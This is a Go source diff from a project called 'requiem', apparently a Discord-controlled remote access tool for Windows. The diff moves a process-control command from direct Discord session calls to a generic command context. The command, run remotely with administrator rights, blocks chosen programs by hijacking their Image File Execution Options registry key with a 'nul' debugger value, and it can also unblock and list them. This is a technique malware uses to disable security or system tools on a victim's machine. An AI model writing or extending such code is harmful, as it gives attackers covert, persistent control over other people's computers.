@@ -7,20 +7,19 @@ import (
 	"requiem/store"
 	"requiem/utils"
 
-	"github.com/bwmarrin/discordgo"
 	"golang.org/x/sys/windows/registry"
 )
 
 const EXEC_OPTIONS = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
 
-func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*ProcCommand) Exec(ctx *store.CommandContext, args []string) {
 	if !store.IsAdmin {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Administrator privileges are required to do this.", msg.Reference())
+		ctx.ReplyMsg("🟥 Administrator privileges are required to do this.")
 		return
 	}
 
 	if len(args) < 1 {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a flag.", msg.Reference())
+		ctx.ReplyMsg("🟥 You need to provide a flag.")
 		return
 	}
 
@@ -30,14 +29,14 @@ func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 
 	process := utils.UnwrapQuotes(content)
 	if process == "" && !list {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to wrap the process file name in double quotes.", msg.Reference())
+		ctx.ReplyMsg("🟥 You need to wrap the process file name in double quotes.")
 		return
 	}
 
 	if utils.HasFlag(content, "block") {
 		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process, registry.SET_VALUE)
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create key - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create key - %s", err))
 			return
 		}
 
@@ -45,24 +44,24 @@ func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 
 		err = key.SetStringValue("Debugger", "nul")
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set hook value - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to set hook value - %s", err))
 			return
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully blocked process.", msg.Reference())
+		ctx.ReplyMsg("🟩 Successfully blocked process.")
 		return
 	}
 
 	if utils.HasFlag(content, "unblock") {
 		err := registry.DeleteKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process)
 		if err == nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully unblocked process.", msg.Reference())
+			ctx.ReplyMsg("🟩 Successfully unblocked process.")
 			return
 		}
 
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, EXEC_OPTIONS+process, registry.SET_VALUE)
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to unblock process (1) - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to unblock process (1) - %s", err))
 			return
 		}
 
@@ -70,18 +69,18 @@ func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 
 		err = key.DeleteValue("Debugger")
 		if err == nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully unblocked process.", msg.Reference())
+			ctx.ReplyMsg("🟩 Successfully unblocked process.")
 			return
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to unblock process (2) - %s", err), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to unblock process (2) - %s", err))
 		return
 	}
 
 	if list {
 		key, err := registry.OpenKey(registry.LOCAL_MACHINE, EXEC_OPTIONS, registry.READ)
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to open key - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to open key - %s", err))
 			return
 		}
 
@@ -89,7 +88,7 @@ func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 
 		subs, err := key.ReadSubKeyNames(-1)
 		if err != nil {
-			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to open sub keys - %s", err), msg.Reference())
+			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to open sub keys - %s", err))
 			return
 		}
 
@@ -116,15 +115,15 @@ func (*ProcCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, a
 		}
 
 		if len(blocked) == 0 {
-			ses.ChannelMessageSendReply(msg.ChannelID, "There are no blocked processes.", msg.Reference())
+			ctx.ReplyMsg("There are no blocked processes.")
 			return
 		}
 
-		ses.ChannelMessageSendReply(msg.ChannelID, "Blocked processes:\n```\n"+strings.Join(blocked, "\n")+"```", msg.Reference())
+		ctx.ReplyMsg("Blocked processes:\n```\n" + strings.Join(blocked, "\n") + "```")
 		return
 	}
 
-	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
+	ctx.ReplyMsg("🟥 Invalid flag.")
 }
 
 func (*ProcCommand) Name() string {
